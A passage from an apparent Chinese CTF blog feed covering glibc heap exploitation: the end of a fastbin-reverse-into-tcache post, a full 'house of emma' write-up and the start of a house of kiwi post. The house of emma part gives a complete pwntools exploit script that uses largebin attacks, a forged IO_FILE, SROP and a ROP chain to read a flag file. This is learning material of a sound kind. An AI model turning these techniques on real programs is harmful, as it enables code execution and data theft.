class="line">&#125;</span><br></pre></td></tr></table></figure><p>并且在上面poc也说了，如果我们再一次malloc即可获得我们目标地址的chunk，也就是可以进行任意地址分配chunk。</p><hr><p>参考链接：<a class="link"   href="https://github.com/shellphish/how2heap/blob/master/glibc_2.31/fastbin_reverse_into_tcache.c" >https://github.com/shellphish/how2heap/blob/master/glibc_2.31/fastbin_reverse_into_tcache.c<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这一利用方式是一种类似于unsorted bin，&lt;a href=&quot;https://cv196082.gitee.io/2022/02/24/tcache-stashing-unlink-attack/&quot;&gt;tcache stashing unlink attack&lt;/a&gt;可</summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="堆利用" scheme="https://cv196082.gitee.io/tags/%E5%A0%86%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>house of emma</title>
    <link href="https://cv196082.gitee.io/2022/05/17/house-of-emma/"/>
    <id>https://cv196082.gitee.io/2022/05/17/house-of-emma/</id>
    <published>2022-05-17T07:46:12.000Z</published>
    <updated>2022-07-25T15:08:24.000Z</updated>
    
    <content type="html"><![CDATA[<p>在glibc2.34中删除了malloc_hook和free_hook，所以孕育而生了一个新的利用方法house of emma。这篇文章需要两个前置知识<a href="https://cv196082.gitee.io/2022/02/23/largebin-attack/">largebin attack</a>和<a href="https://cv196082.gitee.io/2022/05/13/glibc2-32%E7%9A%84%E5%A0%86%E9%A3%8E%E6%B0%B4-house-of-kiwi%E5%AE%9E%E4%BE%8B/">house of kiwi</a>在这里就不再提了。然后后面一篇文章上次好像提了是写how2heap在glibc2.31之后的变化总结，不过会新加一个利用方式也是我今天才知道的Fastbin Reverse Into Tcache(先给自己挖个坑)</p><h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>为什么说house of emma的前置知识需要house of kiwi是因为其退出的方式是_exit(0)所以没有办法使用以往的fsop的方式来进行，调用的链子还是使用assert来触发。他们之间的不同点就是这里利用的vtable不一样。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_cookie_jumps</span> <span class="title">libio_vtable</span> =</span> &#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_file_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_file_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_default_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_file_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_cookie_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_file_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_file_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_cookie_read),</span><br><span class="line">  JUMP_INIT(write, _IO_cookie_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_cookie_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_cookie_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里使用的是上面的这个vtable，其中的几个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">ssize_t</span></span><br><span class="line">_IO_cookie_read (FILE *fp, <span class="keyword">void</span> *buf, <span class="keyword">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (struct _IO_cookie_file *) fp;</span><br><span class="line">  <span class="keyword">cookie_read_function_t</span> *read_cb = cfile-&gt;__io_functions.read;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (read_cb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (read_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read_cb (cfile-&gt;__cookie, buf, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">ssize_t</span></span><br><span class="line">_IO_cookie_write (FILE *fp, <span class="keyword">const</span> <span class="keyword">void</span> *buf, <span class="keyword">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (struct _IO_cookie_file *) fp;</span><br><span class="line">  <span class="keyword">cookie_write_function_t</span> *write_cb = cfile-&gt;__io_functions.write;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (write_cb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (write_cb == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">ssize_t</span> n = write_cb (cfile-&gt;__cookie, buf, size);</span><br><span class="line">  <span class="keyword">if</span> (n &lt; size)</span><br><span class="line">    fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">off64_t</span></span><br><span class="line">_IO_cookie_seek (FILE *fp, <span class="keyword">off64_t</span> offset, <span class="keyword">int</span> dir)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (struct _IO_cookie_file *) fp;</span><br><span class="line">  <span class="keyword">cookie_seek_function_t</span> *seek_cb = cfile-&gt;__io_functions.seek;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (seek_cb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ((seek_cb == <span class="literal">NULL</span></span><br><span class="line">       || (seek_cb (cfile-&gt;__cookie, &amp;offset, dir)</span><br><span class="line">           == <span class="number">-1</span>)</span><br><span class="line">       || offset == (<span class="keyword">off64_t</span>) <span class="number">-1</span>)</span><br><span class="line">      ? _IO_pos_BAD : offset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">_IO_cookie_close (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (struct _IO_cookie_file *) fp;</span><br><span class="line">  <span class="keyword">cookie_close_function_t</span> *close_cb = cfile-&gt;__io_functions.close;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (close_cb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (close_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> close_cb (cfile-&gt;__cookie);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>都是直接调用指针当作函数来调用，也就存在了一定的安全隐患了。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220517140003113.png"                      alt="image-20220517140003113"                ></p><p>这里查看汇编代码可以看到是将取出来的值首先循环右移了0x11接着与fs:0x30进行异或之后检验rax是否为空，最后再调用rax。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> PTR_MANGLE(var) \</span></span><br><span class="line"><span class="meta">  (var) = (__typeof (var)) ((uintptr_t) (var) ^ __pointer_chk_guard_local)</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> PTR_DEMANGLE(var)     PTR_MANGLE (var)</span></span><br></pre></td></tr></table></figure><p>其实异或这一部也就是上面调用的这个函数干的事情。所以如果我们想要劫持程序执行流还必须泄漏这个的话就很麻烦了，所以我们不选择泄漏他的值，我们选择覆盖他的值，后面在往这里写入地址的时候作相应的处理即可。</p><h2 id="题目house-of-emma"><a href="#题目house-of-emma" class="headerlink" title="题目house of emma"></a>题目house of emma</h2><p>题目的逆向过程没什么好说的又不是cpp，所以这里就不再提。</p><p>然后题目存在的漏洞就是free之后没有清空指针导致UAF了。</p><p>其实懂了上面所描述的这道题就很好理解了，直接可以自己做出来了。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">idx, size</span>):</span></span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    payload += p8(<span class="number">0x1</span>)</span><br><span class="line">    payload += p8(idx)</span><br><span class="line">    payload += p16(size)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    payload += p8(<span class="number">0x2</span>)</span><br><span class="line">    payload += p8(idx)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    payload += p8(<span class="number">0x3</span>)</span><br><span class="line">    payload += p8(idx)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    payload += p8(<span class="number">0x4</span>)</span><br><span class="line">    payload += p8(idx)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(content))</span><br><span class="line">    payload += p16(<span class="built_in">len</span>(content))</span><br><span class="line">    payload += content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>():</span></span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    payload += p8(<span class="number">0x5</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(payload) &gt; <span class="number">0x500</span>:</span><br><span class="line">        error(<span class="string">&#x27;!!!&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Pls input the opcode&#x27;</span>)</span><br><span class="line">    r.send(payload)</span><br><span class="line">    payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0</span>, <span class="number">0x410</span>)</span><br><span class="line">create(<span class="number">1</span>, <span class="number">0x410</span>)</span><br><span class="line">create(<span class="number">2</span>, <span class="number">0x420</span>)</span><br><span class="line">create(<span class="number">3</span>, <span class="number">0x430</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">run()</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">run()</span><br><span class="line">r.recvline()</span><br><span class="line">libc_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x1f30b0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">gadget_addr = libc_base + <span class="number">0x146020</span></span><br><span class="line">pointer_chk_guard_local = libc_base + <span class="number">0x234c10</span> + <span class="number">0x2000</span></span><br><span class="line">setcontext_addr = libc_base + <span class="number">0x50bfd</span></span><br><span class="line">pop_rdi = libc_base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdi\nret&#x27;</span>)))</span><br><span class="line">pop_rsi = libc_base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rsi\nret&#x27;</span>)))</span><br><span class="line">pop_rax = libc_base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rax\nret&#x27;</span>)))</span><br><span class="line">syscall = libc_base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;syscall\nret&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">run()</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">heap_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x2ae0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(</span><br><span class="line">    <span class="number">2</span>,</span><br><span class="line">    flat(libc_base + <span class="number">0x1f30b0</span>, libc_base + <span class="number">0x1f30b0</span>, heap_base + <span class="number">0x2ae0</span>,</span><br><span class="line">         libc_base + libc.symbols[<span class="string">&#x27;stderr&#x27;</span>] - <span class="number">0x20</span>))</span><br><span class="line">create(<span class="number">5</span>, <span class="number">0x430</span>)</span><br><span class="line">create(<span class="number">0</span>, <span class="number">0x410</span>)</span><br><span class="line">run()</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(</span><br><span class="line">    <span class="number">2</span>,</span><br><span class="line">    flat(libc_base + <span class="number">0x1f30b0</span>, libc_base + <span class="number">0x1f30b0</span>, heap_base + <span class="number">0x2ae0</span>,</span><br><span class="line">         pointer_chk_guard_local))</span><br><span class="line">create(<span class="number">6</span>, <span class="number">0x430</span>)</span><br><span class="line">run()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ROL</span>(<span class="params">content, key</span>):</span></span><br><span class="line">    tmp = <span class="built_in">bin</span>(content)[<span class="number">2</span>:].rjust(<span class="number">64</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(tmp[key:] + tmp[:key], <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">7</span>, <span class="number">0x450</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">create(<span class="number">8</span>, <span class="number">0x430</span>)</span><br><span class="line">run()</span><br><span class="line">edit(<span class="number">7</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x430</span> + flat(<span class="number">0</span>, <span class="number">0x300</span>))</span><br><span class="line">run()</span><br><span class="line"></span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">srop_addr = heap_base + <span class="number">0x2ae0</span> + <span class="number">0x10</span></span><br><span class="line">fake_IO_FILE = <span class="number">2</span> * p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x58</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(next_chain)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_base)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xC8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libc.sym[<span class="string">&#x27;_IO_cookie_jumps&#x27;</span>] + <span class="number">0x40</span>)</span><br><span class="line">fake_IO_FILE += p64(srop_addr)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(ROL(gadget_addr ^ (heap_base + <span class="number">0x22a0</span>), <span class="number">0x11</span>))</span><br><span class="line"></span><br><span class="line">fake_frame_addr = srop_addr</span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rdi = fake_frame_addr + <span class="number">0xF8</span></span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0x100</span></span><br><span class="line">frame.rsp = fake_frame_addr + <span class="number">0xF8</span> + <span class="number">0x10</span></span><br><span class="line">frame.rip = pop_rdi + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">rop_data = [</span><br><span class="line">    pop_rax, <span class="number">2</span>, syscall, pop_rax, <span class="number">0</span>, pop_rdi, <span class="number">3</span>, pop_rsi,</span><br><span class="line">    fake_frame_addr + <span class="number">0x200</span>, syscall, pop_rax, <span class="number">1</span>, pop_rdi, <span class="number">1</span>, pop_rsi,</span><br><span class="line">    fake_frame_addr + <span class="number">0x200</span>, syscall</span><br><span class="line">]</span><br><span class="line">pay = p64(<span class="number">0</span>) + p64(fake_frame_addr) + <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x10</span> + p64(setcontext_addr +</span><br><span class="line">                                                           <span class="number">61</span>)</span><br><span class="line">pay += <span class="built_in">bytes</span>(frame).ljust(<span class="number">0xF8</span>, <span class="string">b&#x27;\x00&#x27;</span>)[<span class="number">0x28</span>:] + <span class="string">b&#x27;flag&#x27;</span>.ljust(</span><br><span class="line">    <span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>) + flat(rop_data)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, pay)</span><br><span class="line">edit(<span class="number">2</span>, fake_IO_FILE)</span><br><span class="line">run()</span><br><span class="line"></span><br><span class="line">create(<span class="number">9</span>, <span class="number">0x450</span>)</span><br><span class="line">run()</span><br><span class="line"></span><br><span class="line">gdb.attach(r)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="反思与总结"><a href="#反思与总结" class="headerlink" title="反思与总结"></a>反思与总结</h3><p>上面exp其实是跑不通的，主要原因就是ld在不同环境的偏移不一致导致的，在我的docker环境中pointer_chk_guard_local指针的地址位于不可写的地方，所以我就随便找到了个地方代替他，就假装修改了。</p><p>这一利用方式中可以看出来大量使用了large bin attack，并且题目的并没有存在可以任意地址写的漏洞，或者说是构造出这样一个漏洞出来，所以这一利用方式的限制条件其实也比较小。</p><hr><p>参考文章：</p><p><a class="link"   href="https://blog.wjhwjhn.com/archives/751/" >https://blog.wjhwjhn.com/archives/751/<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在glibc2.34中删除了malloc_hook和free_hook，所以孕育而生了一个新的利用方法house of emma。这篇文章需要两个前置知识&lt;a href=&quot;https://cv196082.gitee.io/2022/02/23/largebin-attac</summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="house of 系列" scheme="https://cv196082.gitee.io/tags/house-of-%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>glibc2.32的堆风水+house of kiwi实例</title>
    <link href="https://cv196082.gitee.io/2022/05/13/glibc2-32%E7%9A%84%E5%A0%86%E9%A3%8E%E6%B0%B4-house-of-kiwi%E5%AE%9E%E4%BE%8B/"/>
    <id>https://cv196082.gitee.io/2022/05/13/glibc2-32%E7%9A%84%E5%A0%86%E9%A3%8E%E6%B0%B4-house-of-kiwi%E5%AE%9E%E4%BE%8B/</id>
    <published>2022-05-13T13:12:41.000Z</published>
    <updated>2022-07-25T15:08:08.269Z</updated>
    
    <content type="html"><![CDATA[<p>看我前面的文章可以发现我在做漏洞利用的总结主要是在glibc2.31以下版本的，这也就导致了在后续版本的glibc的利用方式我也没怎么掌握，后续打算将house of kiwi以及house of Emma写完之后会关注一下glibc2.31之后的how2heap的poc，如果存在差异就会写文章记录。</p><p>在学校的一次比赛当中我出了一道题，是glibc2.23版本的，当时的解题关键就是off by null进行多个堆合并，利用方式较为简单。但是就目前的glibc2.32中consolidate的条件是比较苛刻的，因此出现了新的堆风水的方式了(这篇文章也是把以前的坑填了)。</p><h2 id="隔块堆合并手法"><a href="#隔块堆合并手法" class="headerlink" title="隔块堆合并手法"></a>隔块堆合并手法</h2><p>首先还是先看源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = prev_size (p);</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">    unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 